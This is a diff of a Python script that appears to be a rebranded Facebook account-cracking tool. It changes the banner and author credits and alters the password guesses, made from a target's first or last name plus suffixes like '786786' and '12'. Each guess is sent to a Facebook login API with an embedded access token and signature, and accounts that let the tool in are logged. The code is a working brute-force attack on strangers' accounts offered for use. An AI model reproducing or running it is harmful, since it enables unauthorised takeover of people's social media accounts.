@@ -58,11 +58,12 @@ Y='\033[1;93m'
 #Dev:TECH ABM
 #### LOGO ####
 logo = """
-          \033[1;91m──▒▒▒▒▒────▄████▄─────
-           \033[1;92m─▒─▄▒─▄▒──███▄█▀──────
-           \033[1;91m─▒▒▒▒▒▒▒─▐████──█──█──
-           \033[1;92m─▒▒▒▒▒▒▒──█████▄──────
-           \033[1;91m─▒─▒─▒─▒───▀████▀─────
+          \033[1;91m██████╗░███████╗██╗░░░██╗██╗██╗░░░░░           
+	  \033[1;92m██╔══██╗██╔════╝██║░░░██║██║██║░░░░░           
+	  \033[1;91m██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░           
+	  \033[1;92m██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░          
+	  \033[1;91m██████╔╝███████╗░░╚██╔╝░░██║███████╗           
+	  \033[1;92m╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝
            \033[1;91m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
            \033[1;92m█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
            \033[1;91m█░░║║║╠─║─║─║║║║║╠─░░█
@@ -70,9 +71,9 @@ logo = """
            \033[1;91m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
 	   \033[1;47m \033[1;31m Coder by : Tech-Abm \033[1;0m     
 \033[0;95m╭════════════════════════════════════════════╮
-\033[0;91m║\033[0;91mAUTHOR : \033[0;92mTECH ABM                     \033[0;91m      ║
-\033[0;91m║\033[0;91mGITHUB :\033[0;92m https://github.com/Tech-abm   \033[0;91m     ║
-\033[0;91m║\033[0;91mFB PAGE :\033[0;92m https://m.facebook.com/Techabm \033[0;91m   ║
+\033[0;91m║\033[0;91mAUTHOR : \033[0;92mUSER JAVHD                     \033[0;91m      ║
+\033[0;91m║\033[0;91mGITHUB :\033[0;92m https://github.com/aa1878/devil   \033[0;91m     ║
+\033[0;91m║\033[0;91mFB PAGE :\033[0;92m https://m.facebook.com/DEVILS69JAVHD \033[0;91m   ║
 \033[0;95m╰════════════════════════════════════════════╯
 \033[1;94m⊱══════════════════⊱═⊰DISCLAIMER⊱═⊰══════════════════⊰
 \033[1;91mWARNING :\033[1;93mUSE A FRESH ACCOUNT TO LOGIN, DO NOT USE OLD ACCOUNT LOGIN OTHERWISE YOUR ACCOUNT WILL BE BLOCK
@@ -166,7 +167,7 @@ jalan('\033[1;94m──────────██──█──█──█
 jalan('\033[1;94m──────────██──█──█──█──██')
 jalan('\033[1;94m──────────██──█──█──█──██')
 jalan('\033[1;94m───────────█▄▄█▄▄█▄▄█▄▄█')
-jalan('\033[1;47m                \033[1;31mTECH-ABM                  \033[1;0m     ') 
+jalan('\033[1;47m                \033[1;31mUSER-JAV                  \033[1;0m     ') 
 jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 
 jalan('\033[1;91m      \033[1;91m ENTER TOOL USERNAME AND PASSWORD \033[1;0m     ') 
 jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 
@@ -470,7 +471,7 @@ def pilih_super():
 				    cek.close()
 				    cekpoint.append(user+pass1)
                                 else:
-				    pass2 = b['first_name'] + '12345'										
+				    pass2 = b['first_name'] + '786786'										
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			            q = json.load(data)												
 			            if 'access_token' in q:	
@@ -536,7 +537,7 @@ def pilih_super():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = b['first_name'] + '123456'										
+						                       pass5 = b['first_name'] + '786786'										
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -602,7 +603,7 @@ def pilih_super():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = b['first_name']+'786'									
+										                           pass8 = b['first_name']+'12'									
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -624,7 +625,7 @@ def pilih_super():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = b['last_name'] + '786'					
+										                                       pass9 = b['last_name'] + '12'					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
